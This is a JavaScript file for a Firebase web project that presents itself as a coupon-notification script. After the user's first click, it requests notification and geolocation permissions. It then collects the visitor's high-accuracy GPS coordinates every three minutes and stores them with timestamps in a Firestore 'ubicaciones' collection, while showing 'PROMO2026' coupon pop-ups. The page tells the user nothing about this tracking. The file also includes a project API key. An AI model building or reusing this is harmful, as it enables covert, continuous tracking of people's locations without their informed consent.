/* CONEXION BASE DE DATOS */
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
import {
  getFirestore,
  collection,
  addDoc,
  serverTimestamp,
  getCountFromServer
} from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

const firebaseConfig = {
   apiKey: "AIzaSyArGVXKAsGbTy-hayspW6FR-jC8OpiFOBU",
  authDomain: "jardin-imperial.firebaseapp.com",
  projectId: "jardin-imperial",
  storageBucket: "jardin-imperial.firebasestorage.app",
  messagingSenderId: "285181737070",
  appId: "1:285181737070:web:8af183379d708e71724e7f",
  measurementId: "G-HTNF338689"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

/* FIRESTORE - Guardar ubicación */
async function guardarUbicacionBD(lat, lon) {
  try {
    const colRef = collection(db, "ubicaciones");

    await addDoc(colRef, {
      ubicacion: `${lat}, ${lon}`,
      fecha_ubi: serverTimestamp(),
    });

    console.log("Ubicación guardada:", lat, lon);
  } catch (e) {
    console.error("Error en Firestore:", e);
  }
}

/* GEOLOCALIZACIÓN - Pide permiso una vez, luego solo obtiene */
function obtenerUbicacion() {
  if (!navigator.geolocation) {
    console.warn("Geolocalización no soportada.");
    return;
  }

  const resultado = document.getElementById("resultado");
  if (resultado) resultado.innerHTML = "Actualizando...";

  navigator.geolocation.getCurrentPosition(
    (posicion) => {
      const lat = posicion.coords.latitude;
      const lon = posicion.coords.longitude;
      if (resultado) resultado.innerHTML = `Lat: ${lat}, Lon: ${lon}`;
      guardarUbicacionBD(lat, lon);
    },
    (error) => {
      console.error("Error GPS:", error.message);
    },
    {
      enableHighAccuracy: true,
      timeout: 10000,
      maximumAge: 0,
    }
  );
}

/* NOTIFICACIONES - Service Worker + fallback */
const Noti = {
  msg: "¡Cupón: PROMO2026! 🎁",
  lanzar: async function () {
    if (Notification.permission !== "granted") return;

    const reg = await navigator.serviceWorker.getRegistration();
    if (reg) {
      reg.showNotification("¡Nuevo Cupón!", {
        body: this.msg,
        icon: "/favicon.ico",
        badge: "/favicon.ico",
        vibrate: [200, 100, 200],
        tag: "promo-notification",
      });
    } else {
      new Notification("¡Nuevo Cupón!", { body: this.msg });
    }

    // Notificación visual en pantalla
    const div = document.createElement("div");
    div.textContent = this.msg; // textContent es más seguro que innerHTML
    div.style.cssText =
      "position:fixed;bottom:20px;right:20px;background:#000;color:#fff;padding:15px;border-radius:8px;z-index:9999;font-family:sans-serif;";
    document.body.appendChild(div);
    setTimeout(() => div.remove(), 5000);
  },
};

/* ACTIVACIÓN - Un solo clic del usuario lo inicia todo */
document.addEventListener(
  "click",
  async () => {
    try {
      // 1. Registrar Service Worker (necesario para notificaciones en Android)
      await navigator.serviceWorker.register("/sw.js");

      // 2. Pedir permiso de notificaciones (esto abre el diálogo del navegador)
      const permiso = await Notification.requestPermission();
      if (permiso !== "granted") {
        console.warn("Permiso de notificaciones denegado.");
        return;
      }

      // 3. Obtener ubicación ahora (esto abre el diálogo de ubicación)
      obtenerUbicacion();
      Noti.lanzar();

      // 4. Repetir cada 3 minutos — UN SOLO setInterval
      const INTERVALO = 3 * 60 * 1000; // 180,000 ms
      setInterval(() => {
        obtenerUbicacion();
        Noti.lanzar();
      }, INTERVALO);

    } catch (err) {
      console.error("Error al iniciar:", err);
    }
  },
  { once: true }
);